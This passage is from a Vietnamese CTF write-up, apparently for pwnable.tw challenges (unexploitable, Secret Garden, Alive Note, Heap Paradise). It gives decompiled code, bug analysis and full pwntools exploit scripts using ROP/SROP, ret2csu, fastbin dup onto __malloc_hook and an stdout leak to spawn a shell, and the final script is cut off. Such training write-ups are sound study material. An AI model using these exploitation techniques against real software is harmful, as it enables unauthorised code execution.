0x000000000040040e: call 0x2620; add rsp, 8; ret;
0x000000000040049c: call rax;
0x000000000040049c: call rax; add rsp, 8; ret;
0x0000000000400631: cmp eax, -1; je 0x264f; mov ebx, 0x600e28; nop dword ptr [rax + rax]; sub rbx, 8; call rax;
0x000000000040064a: cmp eax, -1; jne 0x2640; add rsp, 8; pop rbx; pop rbp; ret;
0x0000000000400630: cmp rax, -1; je 0x264f; mov ebx, 0x600e28; nop dword ptr [rax + rax]; sub rbx, 8; call rax;
0x0000000000400649: cmp rax, -1; jne 0x2640; add rsp, 8; pop rbx; pop rbp; ret;
0x0000000000400575: dec ecx; ret;
0x0000000000400503: fdiv dword ptr [rdx - 0x1e]; mov byte ptr [rip + 0x200b1b], 1; add rsp, 8; pop rbx; pop rbp; ret;
0x00000000004005dc: fmul qword ptr [rax - 0x7d]; ret;
0x000000000040048e: in al, dx; or byte ptr [rax - 0x75], cl; add eax, 0x200b49; test rax, rax; je 0x249e; call rax;
0x00000000004005f7: insb byte ptr [rdi], dx; and al, 0x20; mov r14, qword ptr [rsp + 0x28]; mov r15, qword ptr [rsp + 0x30]; add rsp, 0x38; ret;
0x0000000000400504: jb 0x24e8; mov byte ptr [rip + 0x200b1b], 1; add rsp, 8; pop rbx; pop rbp; ret;
0x000000000040049a: je 0x249e; call rax;
0x000000000040049a: je 0x249e; call rax; add rsp, 8; ret;
0x0000000000400536: je 0x2540; pop rbp; mov edi, 0x600e48; jmp rax;
0x00000000004005fc: je 0x2622; sub byte ptr [rbx + rcx*4 + 0x7c], cl; and al, 0x30; add rsp, 0x38; ret;
0x0000000000400634: je 0x264f; mov ebx, 0x600e28; nop dword ptr [rax + rax]; sub rbx, 8; call rax;
0x000000000040053e: jmp rax;
0x000000000040064d: jne 0x2640; add rsp, 8; pop rbx; pop rbp; ret;
0x0000000000400506: mov byte ptr [rip + 0x200b1b], 1; add rsp, 8; pop rbx; pop rbp; ret;
0x000000000040056c: mov eax, 0; call 0x2430; leave; ret;
0x0000000000400491: mov eax, dword ptr [rip + 0x200b49]; test rax, rax; je 0x249e; call rax;
0x0000000000400491: mov eax, dword ptr [rip + 0x200b49]; test rax, rax; je 0x249e; call rax; add rsp, 8; ret;
0x00000000004005f6: mov ebp, dword ptr [rsp + 0x20]; mov r14, qword ptr [rsp + 0x28]; mov r15, qword ptr [rsp + 0x30]; add rsp, 0x38; ret;
0x0000000000400636: mov ebx, 0x600e28; nop dword ptr [rax + rax]; sub rbx, 8; call rax;
0x0000000000400567: mov edi, 0; mov eax, 0; call 0x2430; leave; ret;
0x0000000000400539: mov edi, 0x600e48; jmp rax;
0x0000000000400600: mov edi, dword ptr [rsp + 0x30]; add rsp, 0x38; ret;
0x0000000000400572: mov edx, 0xc9fffffe; ret;
0x00000000004005fb: mov esi, dword ptr [rsp + 0x28]; mov r15, qword ptr [rsp + 0x30]; add rsp, 0x38; ret;
0x0000000000400565: mov esi, eax; mov edi, 0; mov eax, 0; call 0x2430; leave; ret;
0x00000000004005f1: mov esp, dword ptr [rsp + 0x18]; mov r13, qword ptr [rsp + 0x20]; mov r14, qword ptr [rsp + 0x28]; mov r15, qword ptr [rsp + 0x30]; add rsp, 0x38; ret;
0x00000000004005f0: mov r12, qword ptr [rsp + 0x18]; mov r13, qword ptr [rsp + 0x20]; mov r14, qword ptr [rsp + 0x28]; mov r15, qword ptr [rsp + 0x30]; add rsp, 0x38; ret;
0x00000000004005f5: mov r13, qword ptr [rsp + 0x20]; mov r14, qword ptr [rsp + 0x28]; mov r15, qword ptr [rsp + 0x30]; add rsp, 0x38; ret;
0x00000000004005fa: mov r14, qword ptr [rsp + 0x28]; mov r15, qword ptr [rsp + 0x30]; add rsp, 0x38; ret;
0x00000000004005ff: mov r15, qword ptr [rsp + 0x30]; add rsp, 0x38; ret;
0x0000000000400490: mov rax, qword ptr [rip + 0x200b49]; test rax, rax; je 0x249e; call rax;
0x0000000000400490: mov rax, qword ptr [rip + 0x200b49]; test rax, rax; je 0x249e; call rax; add rsp, 8; ret;
0x0000000000400564: mov rsi, rax; mov edi, 0; mov eax, 0; call 0x2430; leave; ret;
0x000000000040063b: nop dword ptr [rax + rax]; sub rbx, 8; call rax;
0x000000000040048f: or byte ptr [rax - 0x75], cl; add eax, 0x200b49; test rax, rax; je 0x249e; call rax;
0x0000000000400510: or byte ptr [rbx + 0x5d], bl; ret;
0x000000000040040f: or eax, 0x48000002; add esp, 8; ret;
0x0000000000400494: or esp, dword ptr [rax]; add byte ptr [rax - 0x7b], cl; sal byte ptr [rdx + rax - 1], 0xd0; add rsp, 8; ret;
0x0000000000400509: or esp, dword ptr [rax]; add byte ptr [rcx], al; add rsp, 8; pop rbx; pop rbp; ret;
0x0000000000400493: or rsp, qword ptr [r8]; add byte ptr [rax - 0x7b], cl; sal byte ptr [rdx + rax - 1], 0xd0; add rsp, 8; ret;
0x0000000000400538: pop rbp; mov edi, 0x600e48; jmp rax;
0x0000000000400512: pop rbp; ret;
0x0000000000400511: pop rbx; pop rbp; ret;
0x000000000040064c: push qword ptr [rbp - 0xf]; add rsp, 8; pop rbx; pop rbp; ret;
0x0000000000400442: ret 0x200b;
0x0000000000400499: sal byte ptr [rdx + rax - 1], 0xd0; add rsp, 8; ret;
0x00000000004005f4: sbb byte ptr [rbx + rcx*4 + 0x6c], cl; and al, 0x20; mov r14, qword ptr [rsp + 0x28]; mov r15, qword ptr [rsp + 0x30]; add rsp, 0x38; ret;
0x0000000000400635: sbb dword ptr [rbx + 0x600e28], edi; nop dword ptr [rax + rax]; sub rbx, 8; call rax;
0x00000000004005fe: sub byte ptr [rbx + rcx*4 + 0x7c], cl; and al, 0x30; add rsp, 0x38; ret;
0x0000000000400641: sub ebx, 8; call rax;
0x0000000000400659: sub esp, 8; call 0x24b0; add rsp, 8; ret;
0x000000000040048d: sub esp, 8; mov rax, qword ptr [rip + 0x200b49]; test rax, rax; je 0x249e; call rax;
0x0000000000400640: sub rbx, 8; call rax;
0x0000000000400658: sub rsp, 8; call 0x24b0; add rsp, 8; ret;
0x000000000040048c: sub rsp, 8; mov rax, qword ptr [rip + 0x200b49]; test rax, rax; je 0x249e; call rax;
0x0000000000400498: test eax, eax; je 0x249e; call rax;
0x0000000000400498: test eax, eax; je 0x249e; call rax; add rsp, 8; ret;
0x0000000000400534: test eax, eax; je 0x2540; pop rbp; mov edi, 0x600e48; jmp rax;
0x0000000000400497: test rax, rax; je 0x249e; call rax;
0x0000000000400497: test rax, rax; je 0x249e; call rax; add rsp, 8; ret;
0x0000000000400533: test rax, rax; je 0x2540; pop rbp; mov edi, 0x600e48; jmp rax;
0x000000000040064b: clc; push qword ptr [rbp - 0xf]; add rsp, 8; pop rbx; pop rbp; ret;
0x000000000040064e: int1; add rsp, 8; pop rbx; pop rbp; ret;
0x0000000000400576: leave; ret;
0x0000000000400657: nop; sub rsp, 8; call 0x24b0; add rsp, 8; ret;
0x000000000040048b: nop; sub rsp, 8; mov rax, qword ptr [rip + 0x200b49]; test rax, rax; je 0x249e; call rax;
0x0000000000400656: nop; nop; sub rsp, 8; call 0x24b0; add rsp, 8; ret;
0x0000000000400417: ret;

115 gadgets found
```

- và ta cần ngẫm nghĩ lại 1 chút , GOT ở bài này có thể ghi được -> ta có thể thay đổi địa chỉ libc ở trong GOT -> thành 1 cái gì đó để có thể khai thác như syscall chẵn hạn 


- ta có thể thấy địa chỉ libc bên trong `got` có `syscall` -> ta hoàn toàn có thể overwrite got để khi thực thi `got` thì nó sẽ như 1 syscall 

![image](https://hackmd.io/_uploads/B16sUtLpke.png)

- ở đây 12 bit cuối của sleep là 680 và nó sẽ không đổi sau mỗi lần chạy , và bên trong hàm `nanosleep` có 1 thứ như vậy 

![image](https://hackmd.io/_uploads/r17MjYUpke.png)

- ta cũng có thể trừ nó đi , ở đoạn `__waitid` ta thấy được `0x7efe69c5360e` đây là 1 syscall so với địa chỉ got hiện tại `0x7efe69c53680` , với địa chỉ này ta chỉ cần overwrite 1 byte thôi , tốt hơn so với địa chỉ ở trên nên ta sẽ chọn thằng này 

- ý tưởng thì có lẽ sẽ là pivot để overwrite bytes này và dùng `srop` , sau khi check lại thì ta cũng thấy bài này có hàm `__libc_csu_init` , vậy bài này có vẻ có thể làm theo nhiều cách , ta có thể dùng `srop` hoặc dùng ret2csu để leak libc -> get shell 

![image](https://hackmd.io/_uploads/HylhiKL61x.png)


- sau 1 lúc pivot thì mình lại kẹt tiếp đoạn frame không đủ bytes giống bài ascis nên có lẽ đến lúc xài ret2csu ròi :< 

- exp của mình khá là dài bởi vì ban đầu mình muốn pivot thử và dùng `sigreturn` , tuy nhiên do số bytes không đủ chứa hết payload nên mình chuyển sang kết hợp với `csu` 



exp: 


```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from time import sleep
context.update(arch="amd64", os="linux")
context.log_level = 'info'

context.log_level = 'debug'
exe = context.binary = ELF('./unexploitable_patched', checksec=False)
libc = exe.libc

def one_gadget(filename, base_addr=0):
  return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', '-l0', filename]).decode().split(' ')]

# shortcuts
def logbase(): log.info("libc base = %#x" % libc.address)
def logleak(name, val):  log.info(name+" = %#x" % val)

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.p.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())

def rcu(d1, d2=0):
  p.recvuntil(d1, drop=True)
  # return data between d1 and d2
  if (d2):
    return p.recvuntil(d2,drop=True)

def start(argv=[], *a, **kw):

    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.ARM:
        return process(['qemu-arm', '-g', '1234', '-L', '/usr/arm-linux-gnueabihf', exe.path])
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/home/app/chall"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        pause()
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
0x0000000000400571
0x0000000000400577

c
'''.format(**locals())

# ==================== EXPLOIT ====================

def init():
    global p

    p = start()

def exploit():
    pivot = 0x000000000040055b
    target = p8(0x0e)
    bss = 0x602000 - 0x100
    offset = 16
    call = 0x00000000004005d0
    pop_csu = 0x00000000004005e6
    pl1 = flat(
            b'a'*offset,
            0x601028+0x8,
            pivot
            )
    input()
    sleep(4)
    p.send(pl1)
    pl2 = flat(
            bss-0x100,
            pivot,
            bss,
            pivot,
            b'/bin/sh\x00'

            )
    input("pl2")
    p.send(pl2)
    pl3 = flat(
            b'a'*offset,
            exe.got.sleep+0x10,
            pivot
            )
    input("pl3")
    p.send(pl3)
    input("pl4")
    pl4 = target
    p.send(pl4)
    input("pl5")
    pl5 = flat(
            b'a'*offset,
            bss-0x200,
            pop_csu,
            0,0,1,exe.got.read,0,0x601e50,0x300,
            call
            )
    p.send(pl5)
    frame = SigreturnFrame()
    frame.rax = 0x3b
    frame.rsi = 0
    frame.rdx = 0
    frame.rip = exe.plt.sleep
    frame.rdi = 0x601040
    frame.rsp = bss-0x200
    pl = flat(
            0,0,0,0,0,0,0,
            exe.sym.read,
            exe.plt.sleep,
            )
    pl += bytes(frame)
    input('final')
    p.send(pl)
    input("sigreturn")
    p.send(b'a'*0xf)



    p.interactive()

if __name__ == '__main__':
    init()
    exploit()
```

## Secret Garden

- ta thấy bài này sẽ có 5 option 

![image](https://hackmd.io/_uploads/SJk1DXupyl.png)

- add_flower : ta thấy ta sẽ được nhập 1 size tùy ý và malloc() -> chunk này sẽ giữ name của flower , còn chunk được malloc ban đầu sẽ giữ chunk chứa flower hiện tại và color của flower 
- `unk_202024` mảng này sẽ giữ số lượng của flower và `qword_202040` sẽ là mảng chứa chunk của color_flower



```c
int add_flower()
{
  _QWORD *v0; // rbx
  void *ptr; // rbp
  _QWORD *v2; // rcx
  int v3; // edx
  int size[9]; // [rsp+4h] [rbp-24h] BYREF

  *(_QWORD *)&size[1] = __readfsqword(0x28u);
  size[0] = 0;
  if ( unk_202024 > 0x63u )
    return puts("The garden is overflow");
  v0 = malloc(0x28uLL);
  *v0 = 0LL;
  v0[1] = 0LL;
  v0[2] = 0LL;
  v0[3] = 0LL;
  v0[4] = 0LL;
  __printf_chk(1LL, "Length of the name :");
  if ( (unsigned int)__isoc99_scanf("%u", size) == -1 )
    exit(-1);
  ptr = malloc((unsigned int)size[0]);
  if ( !ptr )
  {
    puts("Alloca error !!");
    exit(-1);
  }
  __printf_chk(1LL, "The name of flower :");
  read(0, ptr, (unsigned int)size[0]);
  v0[1] = ptr;
  __printf_chk(1LL, "The color of the flower :");
  __isoc99_scanf("%23s", v0 + 2);
  *(_DWORD *)v0 = 1;
  if ( qword_202040[0] )
  {
    v2 = &qword_202040[1];
    v3 = 1;
    while ( *v2 )
    {
      ++v3;
      ++v2;
      if ( v3 == 100 )
        goto LABEL_13;
    }
  }
  else
  {
    v3 = 0;
  }
  qword_202040[v3] = v0;
LABEL_13:
  ++unk_202024;
  return puts("Successful !");
}
```

- print_flower : hàm này sẽ in flower và color flower

```c
int sub_F1D()
{
  __int64 v0; // rbx
  __int64 v1; // rax

  v0 = 0LL;
  if ( unk_202024 )
  {
    do
    {
      v1 = qword_202040[v0];
      if ( v1 && *(_DWORD *)v1 )
      {
        __printf_chk(1LL, "Name of the flower[%u] :%s\n", (unsigned int)v0, *(const char **)(v1 + 8));
        LODWORD(v1) = __printf_chk(
                        1LL,
                        "Color of the flower[%u] :%s\n",
                        (unsigned int)v0,
                        (const char *)(qword_202040[v0] + 16LL));
      }
      ++v0;
    }
    while ( v0 != 100 );
  }
  else
  {
    LODWORD(v1) = puts("No flower in the garden !");
  }
  return v1;
}
```

- remove_flower: ta thấy có 1 bug `uaf` ở hàm này , nó free mà không xóa con trỏ 

```c
int remove_flower()
{
  _DWORD *v1; // rax
  unsigned int v2; // [rsp+4h] [rbp-14h] BYREF
  unsigned __int64 v3; // [rsp+8h] [rbp-10h]

  v3 = __readfsqword(0x28u);
  if ( !unk_202024 )
    return puts("No flower in the garden");
  __printf_chk(1LL, "Which flower do you want to remove from the garden:");
  __isoc99_scanf("%d", &v2);
  if ( v2 <= 0x63 && (v1 = (_DWORD *)qword_202040[v2]) != 0LL )
  {
    *v1 = 0;
    free(*(void **)(qword_202040[v2] + 8LL));
    return puts("Successful");
  }
  else
  {
    puts("Invalid choice");
    return 0;
  }
}
```

- hàm này free color flower và không có `uaf` 


```c
unsigned __int64 sub_EA1()
{
  _QWORD *v0; // rbx
  _DWORD *v1; // rdi
  unsigned __int64 v3; // [rsp+8h] [rbp-20h]

  v3 = __readfsqword(0x28u);
  v0 = qword_202040;
  do
  {
    v1 = (_DWORD *)*v0;
    if ( *v0 && !*v1 )
    {
      free(v1);
      *v0 = 0LL;
      --unk_202024;
    }
    ++v0;
  }
  while ( v0 != &qword_202040[100] );
  puts("Done!");
  return __readfsqword(0x28u) ^ v3;
}
```


- về cách khai thác ở bài này thì có mỗi bug `uaf` , version libc ở bài này là  2.23  -> nghĩa là không có tcache , nên cách khả thi nhất có lẽ là tấn công `fastbin-dup` , về việc leak libc khá dễ dàng nên mình sẽ không nói đến 
- ta sẽ nói về cách mà fast-bin check double-free : 

nói đơn giản là nó sẽ từ chối giải phóng `p` khi `p` đang là chunk đầu tiên trong fast-bin , cách đơn giản để bypass cái này là free 1 chunk xen giữa 


```c
/* Check that the top of the bin is not the record we are going to add
   (i.e., double free).  */
if (__builtin_expect(old == p, 0)) {
	errstr = "double free or corruption (fasttop)";
	goto errout;
}
```



Check 2: malloc(): memory corruption (fast) : cái này nó sẽ check size trong bin nếu phù hợp thì nó sẽ trả về chunk này , nếu không nó sẽ in ra lỗi 

```c
if (__builtin_expect(fastbin_index(chunksize(victim)) != idx, 0)) {
	errstr = "malloc(): memory corruption (fast)";
errout:
	malloc_printerr(check_action, errstr, chunk2mem (victim), av);
	return NULL;
}
```

- nói tóm lại đây chỉ là 1 bài `fastbin-dup` bình thường , nhưng vì các og không thõa mãn nên cần dùng trick lỏ 1 tí đó là khi double free được phát hiện , nó sẽ gọi `malloc_printer()` và th này thõa mãn 1 one_gadget ^^

exp: 

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from time import sleep
context.update(arch="amd64", os="linux")
context.log_level = 'info'

context.log_level = 'debug'
exe = context.binary = ELF('./secretgarden_patched', checksec=False)
libc = exe.libc

def one_gadget(filename, base_addr=0):
  return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', '-l0', filename]).decode().split(' ')]

# shortcuts
def logbase(): log.info("libc base = %#x" % libc.address)
def logleak(name, val):  log.info(name+" = %#x" % val)

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.p.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())

def rcu(d1, d2=0):
  p.recvuntil(d1, drop=True)
  # return data between d1 and d2
  if (d2):
    return p.recvuntil(d2,drop=True)

def start(argv=[], *a, **kw):

    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.ARM:
        return process(['qemu-arm', '-g', '1234', '-L', '/usr/arm-linux-gnueabihf', exe.path])
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/home/app/chall"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        pause()
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
brva 0x0000000000000F8B
brva 0x0000000000000CD3


c
'''.format(**locals())

# ==================== EXPLOIT ====================


def cmd(i):
    p.sendlineafter(b'Your choice : ',str(i).encode())

def add(lenght,name,color):
    cmd(1)
    sla(b'Length of the name :',str(lenght).encode())
    sa(b'The name of flower :',name)
    sla(b'The color of the flower :',color)

def print_flower():
    cmd(2)

def delete_flower(idx):
    cmd(3)
    sla(b'Which flower do you want to remove from the garden:',str(idx).encode())

def delete_garden():
    cmd(4)


def init():
    global p

    p = start()

def exploit():
    add(0x450,b'kuvee1',b'kuvee1')   #0
    add(0x10,b'kuvee2',b'kuvee2')  #1
    delete_flower(0)
    add(0x40,b'a',b'a') #2
    print_flower()
    p.recvuntil(b'Name of the flower[2] :a')
    libc_base = u64((b'\x78' + p.recv(5)).ljust(8,b'\x00')) - 0x3c3b78
    info(f'libc: {hex(libc_base)}')
    add(0x60,b'kuvee3',b'kuvee3') #3
    add(0x60,b'kuvee4',b'kuvee4') #4
    add(0x60,b'hehee',b'hehehe')
    delete_flower(4)
    delete_flower(3)
    delete_flower(4)
    add(0x60,p64(libc_base + 0x3c3b10 - 35),b'nothing')
    add(0x60,b'nothing',b'nothing')
    add(0x60,b'nothing',b'nothing')
    input()
    og = [0x45216,0x4526a,0xef6c4,0xf0567]
    add(0x60,b'a'*19 + p64(libc_base+og[2]),b'nothing')
    info(f'og: {hex(libc_base+og[2])}')
    info(f'malloc: {hex(libc_base+0x3c3b10)}')
    delete_flower(5)
    delete_flower(5)






    p.interactive()

if __name__ == '__main__':
    init()
    exploit()
```

## Alive Note

checksec: 
```
pwndbg> checksec
File:     /home/ploi/pwn/pwnable.tw/Alive Note/alive_note
Arch:     i386
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX unknown - GNU_STACK missing
PIE:        No PIE (0x8048000)
Stack:      Executable
RWX:        Has RWX segments
Stripped:   No
```



- bài này sẽ có 3 option chính

![image](https://hackmd.io/_uploads/H1Qwx4Kakx.png)

- add_note: ta sẽ được nhập 1 idx và read 8 bytes vào `name` , sau khi check xong thì `strdup` tạo 1 vùng nhớ mới để lưu trữ các byte vừa nhập và gán dữ liệu cho chunk đó 

```c
unsigned int add_note()
{
  int idx; // [esp+0h] [ebp-18h]
  char name[8]; // [esp+4h] [ebp-14h] BYREF
  unsigned int v3; // [esp+Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  printf("Index :");
  idx = read_int();
  if ( idx > 10 )
  {
    puts("Out of bound !!");
    exit(0);
  }
  printf("Name :");
  read_input(name, 8u);
  if ( !check(name) )
  {
    puts("It must be a alnum name !");
    exit(-1);
  }
  *(&note + idx) = strdup(name);
  puts("Done !");
  return __readgsdword(0x14u) ^ v3;
}
```


- check: hàm này sẽ check xem các bytes ta nhập vào có phải là chữ hoặc số không

```c
int __cdecl check(char *s)
{
  size_t i; // [esp+Ch] [ebp-Ch]

  for ( i = 0; strlen(s) > i; ++i )
  {
    if ( s[i] != ' ' && ((*__ctype_b_loc())[s[i]] & 8) == 0 )
      return 0;
  }
  return 1;
}
```

- del_note: nhập 1 idx và free chunk+idx  đó 

```c
int del_note()
{
  int result; // eax
  int v1; // [esp+Ch] [ebp-Ch]

  printf("Index :");
  v1 = read_int();
  if ( v1 > 10 )
  {
    puts("Out of bound !!");
    exit(0);
  }
  free(*(&note + v1));
  result = v1;
  *(&note + v1) = 0;
  return result;
}
```

- show_note: hàm này chỉ in dữ liệu nên cũng không có gì đặc biệt 

```c
int show_note()
{
  int result; // eax
  int v1; // [esp+Ch] [ebp-Ch]

  printf("Index :");
  v1 = read_int();
  if ( v1 > 10 )
  {
    puts("Out of bound !!");
    exit(0);
  }
  result = (int)*(&note + v1);
  if ( result )
    return printf("Name : %s\n", (const char *)*(&note + v1));
  return result;
}
```

- ý tưởng của bài này là trước hết ta sẽ cần nhập 1 số âm để khiến 1 hàm got nào đó thực thi shellcode của ta , và `free@got` sẽ là 1 ứng cử viên sáng giá 
- tiếp theo , vì nó chỉ chấp nhận shellcode chữ số và mỗi lần read ta chỉ được read 8 bytes , Việc xây dựng shellcode hoàn toàn bằng chữ hoa, chữ thường hoặc số là một ý tưởng phổ biến trên mạng. Chủ yếu là sử dụng các lệnh như push, pop, xor, dec, jne để xây dựng (lưu ý rằng khi xor, thường sử dụng thanh ghi al).

- ngoài ra ta cũng cần chain các bytes shellcode giữa các chunk với nhau , ở đây ta có thể dùng `jne` 

- và cuối cùng là Xây dựng lệnh int 0x80 bằng phép trừ và phép XOR 


## Heap Paradise

- đọc tên bài này thì chắc chắn biết là đây là 1 bài heap =))) , tuy nhiên điều đặc biệt ở đây là bài này không có hàm nào để leak libc và đây sẽ là 1 trong những điều khá khó khăn của bài này 

```c
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
{
  __int64 v3; // rax

  setup(a1, a2, a3);
  while ( 1 )
  {
    while ( 1 )
    {
      menu();
      v3 = read_int();
      if ( v3 != 2 )
        break;
      delete();
    }
    if ( v3 == 3 )
      exit(0);
    if ( v3 == 1 )
      add();
    else
      puts("Invalid Choice !");
  }
}
```


- add: ta có thể thấy được ta sẽ được nhập 1 size <= 0x78 và gán chunk này cho 1 mảng global , tiếp theo nữa là read dữ liệu vào chunk như bình thường 

```c
int sub_C8D()
{
  unsigned __int64 size_ptr; // rax
  int i; // [rsp+4h] [rbp-Ch]
  unsigned int size; // [rsp+8h] [rbp-8h]

  for ( i = 0; ; ++i )
  {
    if ( i > 15 )
    {
      LODWORD(size_ptr) = puts("You can't allocate anymore !");
      return size_ptr;
    }
    if ( !array_ptr[i] )
      break;
  }
  printf("Size :");
  size_ptr = read_int();
  size = size_ptr;
  if ( size_ptr <= 0x78 )
  {
    array_ptr[i] = malloc(size_ptr);
    if ( !array_ptr[i] )
    {
      puts("Error!");
      exit(-1);
    }
    printf("Data :");
    LODWORD(size_ptr) = read_ptr(array_ptr[i], size);
  }
  return size_ptr;
}
```

- delete: hàm này đơn giản là free chunk thôi và ở đây cũng xảy ra `uaf`


```c
void delete()
{
  __int64 idx; // [rsp+8h] [rbp-8h]

  printf("Index :");
  idx = read_int();
  if ( idx <= 15 )
    free((void *)array_ptr[idx]);
}
```


### EXPLOIT

vậy với mỗi bug `uaf` và không có hàm nào in dữ liẹu của chunk , ta làm sao có thể leak libc? 

- ý tưởng là ta sẽ setup các chunk chồng chéo để tạo 1 chunk giả với 1 size khi giải phóng nó có thể vào `unsorted-bin` , và ta sẽ overwrite địa chỉ libc này thành `stdout` và thay đổi dữ liệu trong `stdout` để có thể leak libc 

-------------

- malloc 2 lần 

![image](https://hackmd.io/_uploads/ry-RoT96Jg.png)

- after double-free (free-0-1-0)

![image](https://hackmd.io/_uploads/S1m-ha5pkg.png)

- malloc lại 1 lần nữa và thay đổi fd của 0 thành `chunk0+0x20` , lúc này bins ( 1-> 0> 0+x20)

![image](https://hackmd.io/_uploads/S1O9na9TJe.png)

- sau đó malloc 2 lần để lấy 1->0 ra và lần malloc tiếp theo là chunk0+0x20

![image](https://hackmd.io/_uploads/SkUm6T5pJe.png)

- tiếp theo là free 1 lần nữa và malloc lại để thay đổi size của chunk cần trigger

![image](https://hackmd.io/_uploads/B1C5aT96kl.png)

- ta có thể thấy các chunk hiện tại trong `array-ptr`

![image](https://hackmd.io/_uploads/SkJr0Tca1e.png)

- và vì ta đã fake size của chunk 5 thành công bây giờ nếu ta `free` nó sẽ vào `unsorted-bin` 

![image](https://hackmd.io/_uploads/S1pwRTqp1x.png)

- ta thấy bây giờ ta đã thành công đưa nó vào `unsorted-bin`

![image](https://hackmd.io/_uploads/Hyq9CT9ayl.png)

- còn 1 điều cần chú ý nữa là ta cần setup size của next chunk của chunk fake thành 1 size hợp lệ để tránh lỗi

![image](https://hackmd.io/_uploads/SyXXGRc6yx.png)


- điều khó khăn kế tiếp sẽ là làm sao để đưa chunk chứa địa chỉ libc vào `fast-bin` , từ đó ta mới có thể overwrite nó thành `stdout` hoặc 1 địa chỉ gần `stdout` và thay đổi giá trị của nó 

- lúc này ta sẽ free 2 chunk0->1  , sau đó ta sẽ malloc 1 0x78 thằng này sẽ lấy từ unsorted-bin ra và phần còn lại sẽ vào chunk đã được setup , ta sẽ input dữ liệu để overwrite `fd` của chunk1 trỏ tới chunk chứa địa chỉ libc 



0x7f73ebdc3620 là địa chỉ `stdout` và `stdout-0x43` chứa 1 size phù hợp để có thể malloc lại , ta sẽ cần `brute-force` 1/16 

![image](https://hackmd.io/_uploads/SydpsJjpJl.png)

------------------

- malloc tiếp theo sẽ fake size của chunk chứa địa chỉ libc và 

![image](https://hackmd.io/_uploads/SyjpJyop1e.png)


![image](https://hackmd.io/_uploads/HJBzxJoTkg.png)



![image](https://hackmd.io/_uploads/B1-oG5sake.png)

- có địa chỉ libc rồi thì chỉ việc xài `og` thôi , ở đây mình tiếp tục dùng `double-free` để nó gọi `malloc_printer()`

exp: 


```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from time import sleep
context.update(arch="amd64", os="linux")
context.log_level = 'info'

context.log_level = 'debug'
exe = context.binary = ELF('./heap_paradise_patched', checksec=False)
libc = ELF('./libc.so.6')

def one_gadget(filename, base_addr=0):
  return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', '-l0', filename]).decode().split(' ')]

# shortcuts
def logbase(): log.info("libc base = %#x" % libc.address)
def logleak(name, val):  log.info(name+" = %#x" % val)

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.p.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())

def rcu(d1, d2=0):
  p.recvuntil(d1, drop=True)
  # return data between d1 and d2
  if (d2):
    return p.recvuntil(d2,drop=True)

def start(argv=[], *a, **kw):

    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.ARM:
        return process(['qemu-arm', '-g', '1234', '-L', '/usr/arm-linux-gnueabihf', exe.path])
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
